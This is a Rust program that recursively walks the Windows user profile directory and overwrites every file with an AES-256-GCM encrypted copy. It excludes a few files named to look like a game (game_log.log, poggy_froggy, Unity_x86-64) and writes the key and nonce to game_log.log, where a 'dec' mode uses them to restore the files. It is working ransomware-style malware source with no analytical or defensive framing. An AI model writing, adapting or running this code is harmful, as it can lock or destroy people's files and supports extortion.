#[feature(split_as_slice)] 
use std::io;
use std::fs::{self, DirEntry};
use std::path::Path;
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng,generic_array::{typenum::consts::U8,GenericArray, ArrayLength}},
    Aes256Gcm, Key
};
use std::io::Read;
use std::io::Write;
use std::env;
use std::io::BufReader;
use hex::ToHex;


fn get_file_as_byte_vec(filename: &String) -> Vec<u8> {
    let mut f = std::fs::File::open(&filename).expect("no file found");
    let metadata = fs::metadata(&filename).expect("unable to read metadata");
    let mut buffer = vec![0; metadata.len() as usize];
    f.read(&mut buffer).expect("buffer overflow");

    buffer
}

fn encrypt(path: String, key: Key<Aes256Gcm>, nonce: &[u8]) -> io::Result<()>{
    let cipher = Aes256Gcm::new(&key);

    let str_path = &path.to_string();
    let file = get_file_as_byte_vec(str_path);
    let bytes = GenericArray::clone_from_slice(nonce);
    let enc_bytes = cipher.encrypt(&bytes, file.as_slice()).unwrap();
    let mut f = std::fs::OpenOptions::new().write(true).truncate(true).open(str_path)?;
    f.write_all(&enc_bytes)?;
    f.flush()?;
    Ok(())
}

fn decrypt(path: String, key: Key<Aes256Gcm>, nonce: &[u8]) -> io::Result<()>{
    let cipher = Aes256Gcm::new(&key);

    let str_path = &path.to_string();
    let file = get_file_as_byte_vec(str_path);
    let bytes = GenericArray::clone_from_slice(nonce);
    let enc_bytes = cipher.decrypt(&bytes, file.as_slice()).unwrap();
    let mut f = std::fs::OpenOptions::new().write(true).truncate(true).open(str_path)?;
    f.write_all(&enc_bytes)?;
    f.flush()?;
    Ok(())
}

fn walk_dir(dir: &Path, key: Key<Aes256Gcm>, nonce: &[u8], cb: &dyn Fn(String, Key<Aes256Gcm>, &[u8]) -> io::Result<()> ) -> io::Result<()> {
    if dir.is_dir() {
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                walk_dir(&path, key.clone(), nonce.clone(), cb)?;
            } else {
                if path.to_str().unwrap().to_string().contains("game_log.log") == false  && path.to_str().unwrap().to_string().contains("poggy_froggy") == false && path.to_str().unwrap().to_string().contains("Unity_x86-64") == false {
                    println!("{:?}", path);
                    let _ = cb(path.to_str().unwrap().to_string(), key, nonce);
                }
            }
        }
    }
    Ok(())
}

fn read_lines(filename: &str) -> Vec<String> {
    std::fs::read_to_string(filename) 
        .unwrap()  // panic on possible file-reading errors
        .lines()  // split the string into an iterator of string slices
        .map(String::from)  // make each slice into a string
        .collect()  // gather them together into a vector
}

fn main() -> io::Result<()> {
    let key = Aes256Gcm::generate_key(OsRng);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng); 

    let args: Vec<String> = env::args().collect();
    let binding = env::var("USERPROFILE").unwrap();
    let base = Path::new(&binding);

    if args.len() > 1 {
        match args[1].as_str() {
            "enc" => {
                let _ = walk_dir(base, key, nonce.as_slice(), &encrypt );
                let mut f = std::fs::File::create("game_log.log")?;
                let mut content: Vec<String> = vec![];
                content.push(hex::encode(key.as_slice()));
                content.push(hex::encode(nonce.as_slice()));
                f.write_all(content.join("\n").as_bytes())?;
                f.flush()?;
            }
            "dec" => {
                let lines = read_lines("game_log.log");
                let key_bytes = hex::decode(&lines[0]).unwrap();
                // slice.next();
                let nonce_bytes = hex::decode(&lines[1]).unwrap();

                let log_key = Key::<Aes256Gcm>::from_slice(&key_bytes.as_slice());
                let _ = walk_dir(base, *log_key, &nonce_bytes.as_slice(), &decrypt );
            }
            &_ => {
                println!("user: {}", env::var("USERPROFILE").unwrap())
            }
        }
    } else {
        println!("user: {}", env::var("USERPROFILE").unwrap())
    }
    Ok(())
}
